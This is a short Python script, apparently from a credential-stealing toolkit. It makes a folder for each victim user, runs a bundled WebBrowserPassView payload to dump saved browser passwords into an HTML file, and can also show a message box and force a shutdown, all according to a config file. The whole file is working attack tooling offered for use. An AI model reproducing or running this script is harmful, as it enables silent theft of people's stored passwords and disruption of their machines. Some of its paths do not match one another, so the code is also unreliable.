import os, sys, ctypes, getpass
exec(open("./config.py").read())


# setting up directory
usr = getpass.getuser()
if not os.path.exists("hosts/" + usr):
    os.makedirs("hosts/" + usr)
    root = usr
elif duplicate_exec:
    usr_x = 1
    usr_ct = 2
    while usr_x:
        usr_ct = str(usr_ct)
        if not os.path.exists("hosts/"+ usr + " (" + usr_ct + ")"):
            os.makedirs("hosts/" + usr + " (" + usr_ct + ")")
            root = usr + " (" + usr_ct + ")"
            usr_x = 0
        else:
            usr_ct = int(usr_ct)
            usr_ct += 1
else:
    sys.exit()

rootdir = "..\hosts\\" + root + "\\"
print("\"" + rootdir + "Browser passwords.html" + "\"")
# password recovery
if browser_pwds:
    os.system("payloads\WebBrowserPassView.exe /shtml " + rootdir + "Browser.html")


# msg box
if msgbox["controller"]:
    ctypes.windll.user32.MessageBoxW(0, msgbox["msg"], msgbox["title"], msgbox["buttons"])

# shutdown code
if power["controller"]:
    if power["mode"] != "":
        shutdown = "shutdown -" + power['mode']
        if power["comment"] != "":
            shutdown = shutdown + " -c " + "\"" + power['comment'] + "\""
        if power["timeout"] != "":
                shutdown = shutdown + " -t " + power['timeout']
        os.system(shutdown)
